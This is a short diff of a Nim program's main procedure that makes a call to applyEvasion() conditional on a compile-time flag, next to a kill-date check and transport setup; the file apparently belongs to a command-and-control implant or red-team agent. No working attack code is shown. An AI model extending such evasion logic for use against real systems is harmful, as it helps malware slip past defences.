@@ -24,7 +24,8 @@ proc main() =
   killDateCheck()
 
   # Evasion patches
-  applyEvasion()
+  when not defined(noEvasion):
+    applyEvasion()
 
   # Init transport
   var t = newTransport()
